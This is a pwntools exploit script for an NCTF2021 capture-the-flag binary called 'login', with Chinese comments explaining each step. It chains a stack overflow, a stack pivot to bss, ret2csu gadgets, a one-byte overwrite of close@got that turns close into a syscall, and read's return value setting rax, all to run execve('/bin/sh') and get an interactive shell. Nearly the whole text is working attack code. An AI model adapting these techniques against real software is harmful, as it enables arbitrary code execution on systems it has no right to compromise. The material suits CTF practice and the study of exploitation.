from pwn import *

r = process(r'./login')
# r = process(r'./login', env={'LD_PRELOAD': r'./lib/libc.so.6'})
elf = ELF(r'./login')
context.log_level = 'debug'
context.arch = 'amd64'

# buf大小0x100，read读取大小0x110 ===> 栈迁移到bss，且只有一个read函数
# vmmap查看bss权限: --->  0x404000   0x405000 rw-p 1000   3000 /home/pwn_ctf/login

bss_addr = 0x404500
leave_ret = 0x40121f
ret_addr = 0x40101a
pop_rbp = 0x40117d
pop_rdi = 0x401293
read_addr = 0x4011ED
close_plt = 0x401090
close_got = elf.got['close']
read_got = elf.got['read']

print(f"close@got: {hex(close_got)}\nread@got: {hex(read_got)}")

# read的mov rsi,[rbp+buf],buf为rbp-0x100，+0x100是为了抵消校准地址
leave_payload = b'A' * 0x100 + p64(bss_addr + 0x100) + p64(read_addr)
r.sendafter(b'NCTF2021!', leave_payload)

# 不过在控制程序流之前程序就先close(1)、close(2)了，输出流被关闭，所以没法泄露puts内存地址，也就没办法打ret2libc
# puts_payload = b'A' * 8 + p64(pop_rdi) + p64(put_got) + p64(put_plt)
# puts_payload += p64(pop_rbp) + p64(bss_addr + 0x300 + 0x100) + p64(read_addr)
# puts_payload = puts_payload.ljust(0x100, b'B')
# puts_payload += p64(bss_addr) + p64(leave_ret)
# r.sendline(puts_payload)

# 这种情况下考虑打ret2csu，构造execve：
'''
execve('/bin/sh', 0, 0)
rax=0x3b
rdi='/bin/sh'
rsi=0
rdx=0
syscall
'''
# ROPgadget --binary login | grep "syscall" -->> 没有syscall指令
# 这种情况下考虑寻找当前libc下（题目提供），close函数中的syscall指令的位置
# 第一种方法：打开libc.so寻找
'''
text:0000000000114F50 close           proc near               ; CODE XREF: perror+BC↑p
.text:0000000000114F50                                         ; tmpfile64+BA↑p ...
.text:0000000000114F50
.text:0000000000114F50 fd              = dword ptr -0Ch
.text:0000000000114F50
.text:0000000000114F50 ; __unwind {
.text:0000000000114F50                 endbr64                 ; Alternative name is '__close'
.text:0000000000114F54                 mov     eax, fs:18h
.text:0000000000114F5C                 test    eax, eax
.text:0000000000114F5E                 jnz     short loc_114F70
.text:0000000000114F60                 mov     eax, 3
.text:0000000000114F65                 syscall                 ; LINUX - sys_close
.text:0000000000114F67                 cmp     rax, 0FFFFFFFFFFFFF000h
.text:0000000000114F6D                 ja      short loc_114FB0
.text:0000000000114F6F                 retn

ok，这里在glibc里面找到close函数的地址为：0x114F50，那么在题目的二进制文件中，close@got表里面是他的真实地址：libc_base + 0x114F50
然后看到 syscall 指令位于：0x114F65 处，同时libc_base地址结尾必为3个000（因为系统分配动态运行库都是一页的，最小0x1000，所以肯定有3个0，也不用担心libc_base最后一个字节不是0）
所以只需要将 close@got表里面是他的真实地址（libc_base + 0x114F50）的最后一位改为 0x65 即可调用syscall指令
'''
# 第二种方法：爆破close@got的最后一位，0x00-0xff (255种可能)

# 这里用第一种方法
csu1 = 0x401270  # init rdx_rsi_edi,call r15
csu2 = 0x40128A  # pop_rbx_rbp_r12_r13_r14_r15

# 利用ret2csu,实现函数调用
def csu(rdi, rsi, rdx, call_function):
    payload = p64(csu2)
    payload += p64(0)  # rbx=0
    payload += p64(1)  # rbp=1
    payload += p64(rdi)  # r12=edi(rdi)
    payload += p64(rsi)  # r13=rsi
    payload += p64(rdx)  # r14=rdx
    payload += p64(call_function)  # r15=call [r15+rbx*8]
    payload += p64(csu1)
    payload += p64(0) * 6  # 会进入pop_rbx_rbp_r12_r13_r14_r15又会重新pop一遍
    # 其实这里如果是连续调用csu的话，就不需要填补上面这6个pop了，直接重复利用
    payload += p64(0)  # 由于6个pop之前有一句：add rsp, 8，会导致rsp向下移动一次，所以要多一个p64(0)
    return payload

# 利用ret2csu,连续实现函数调用, csu2->cus1->csu2不用重新执行最后cus2的那6个pop
# read(0, close@got, 1)  ==> 修改close@got表的最后一个字节
cus_payload = p64(csu2)
cus_payload += p64(0)  # rbx=0
cus_payload += p64(1)  # rbp=1
cus_payload += p64(0)  # r12=edi(rdi)
cus_payload += p64(close_got)  # r13=rsi
cus_payload += p64(1)  # r14=rdx
cus_payload += p64(read_got)  # r15=call read@got
cus_payload += p64(csu1)
cus_payload += p64(0)  # 由于6个pop之前有一句：add rsp, 8，会导致rsp向下移动一次，所以要多一个p64(0)
# 连续调用，不需要多余去处理csu2的那6个pop，直接进入csu1

# read(0, bss, 0x3b) ==> read函数会将读取到的字节数作为返回值给rax，读取0x3b，就是控制rax=0x3b
cus_payload += p64(0)  # rbx=0
cus_payload += p64(1)  # rbp=1
cus_payload += p64(0)  # r12=edi(rdi)
cus_payload += p64(bss_addr - 0x200)  # r13=rsi (注意，这里开头要写入/bin/sh\x00，并填充够0x3b)
cus_payload += p64(0x3b)  # r14=rdx
cus_payload += p64(read_got)  # r15=call read@got
cus_payload += p64(csu1)
cus_payload += p64(0)

# syscall(59, bss, 0, 0)  ==>  execve('/bin/sh', 0, 0)
cus_payload += p64(0)  # rbx=0
cus_payload += p64(1)  # rbp=1
cus_payload += p64(bss_addr - 0x200)  # r12=edi(rdi)
cus_payload += p64(0)  # r13=rsi
cus_payload += p64(0)  # r14=rdx
cus_payload += p64(close_got)  # r15=call close@got(syscall)
cus_payload += p64(csu1)
cus_payload += p64(0) * 7

print(len(cus_payload))  # 248 (0xF8)

cus_payload = cus_payload.ljust(0x100, b'\x00') + p64(bss_addr - 8) + p64(leave_ret)
shell_payload = b'/bin/sh\x00'.ljust(0x3b, b'\x00')

r.send(cus_payload)
r.send(b'\x65')  # 修改close@got表的最后一个字节为0x65
r.send(shell_payload)  # 控制rax=0x3b并在bss开头写入/bin/sh
r.interactive()
